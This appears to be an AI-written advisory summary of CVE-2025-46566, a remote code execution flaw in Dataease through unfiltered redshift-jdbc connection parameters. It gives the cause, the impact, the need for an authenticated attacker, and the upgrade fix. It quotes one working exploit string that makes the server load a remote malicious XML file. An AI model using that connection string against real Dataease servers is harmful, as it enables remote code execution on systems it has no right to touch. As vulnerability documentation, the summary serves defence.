## CVE Reference Links Content Summary
Here's an analysis of the provided content based on your guidelines:

**Content from github.com_fe2587b6_20250624_194822.html**

*   **Relates to CVE-2025-46566:** Yes, this content explicitly states it's related to CVE-2025-46566.
*   **Root cause of vulnerability:** The vulnerability arises from a lack of keyword filtering in the Dataease software concerning the connection of redshift-jdbc, specifically in versions <= 2.10.8. This allows for the exploitation of a Remote Code Execution (RCE) vulnerability within the vulnerable redshift-jdbc version (v2.1.0.1).
*   **Weaknesses/vulnerabilities present:** RCE via JDBC connection string.
*   **Impact of exploitation:** Authenticated users can achieve RCE.
*   **Attack vectors:** An attacker can construct a malicious JDBC connection string with a payload to trigger the vulnerability.  The content provides a specific example using `jdbc:redshift://127.0.0.1:6666/testdb;socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext;socketFactoryArg=http://127.0.0.1:50025/exp.xml`.  This uses the `socketFactory` parameter to load a malicious XML file.
*   **Required attacker capabilities/position:** Authenticated user. Access to the Dataease software to modify the JDBC connection parameters.
*   **Mitigation or fix:** Upgrade to version 2.10.9 or later.
*   **More detail than the official CVE description:** Yes, the content provides detailed steps for exploitation, including the malicious XML payload, the specific JDBC connection string, and screenshots.
